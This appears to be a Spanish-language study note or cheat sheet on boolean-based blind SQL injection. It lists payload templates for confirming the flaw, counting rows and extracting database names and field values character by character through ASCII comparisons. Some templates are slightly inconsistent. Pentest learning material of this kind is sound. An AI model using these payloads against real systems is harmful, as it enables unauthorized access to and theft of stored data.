### Descubriendo la vulnerabilidad

En este caso buscamos un campo donde podamos validar una respuesta. Luego buscamos una respuesta correcta(true), con esta respuesta correcta, buscamos agregar más lógica a la query con el fin de analizar si un segundo caso se cumple:

    admin' AND 1=1-- -
    admin' AND 1=0-- -

##### Explicación de la lógica:

1. Una vez que validamos que tenemos un dato que es verdadero, agregamos a la query un boolean que sea verdadero. Si esto no resulta falso podemos inferir que el segundo caso (el boolean) está siendo analizado puesto que si tomara todo lo ingresado como un dato completo ya no tendríamos "admin" como dato sino "admin' and...."
2. Inyectamos ahora un caso booleano que de falso. Si la respuesta es Falsa, entonces podemos asegurar que el segundo caso es validado.
3. Utilizamos el segundo caso para hacer querys que puedan darnos una pista de los datos que se están manejando.

### validar cantidad de campos en una tabla

        <dato>' AND (select count(*) from users) > 0-- -

##### otra opción

        <dato>' AND ORDER BY <numero>

### Conseguir el length de un dato de la tabla

        <dato>' AND LEN(<campo a consultar del usuario>)=<length>-- -

### Conseguir el length del nombre de la db

        <dato>’ AND LENGTH(DATABASE())=<length>-- -

### Dumpear el nombre de una DB:

        <dato>’ AND ASCII(SUBSTR(DATABASE(),<index>,X))=<Valor ASCII>-- -

        
### Dumpear los caracteres dentro de un campo

Podemos trabajarlo con valores ASCII(en números del 32 al 127) y luego decodearlos para tener el caracter legible

        <dato>'+AND+ASCII(SUBSTRING(<campo>,<index_del_char>,1))=<valor ASCII>--+-

Una buena página para hacer esta decodificación una vez logrados los resultados(recordar copiar separados los ASCII, luego la página los junta:

https://www.duplichecker.com/ascii-to-text.php
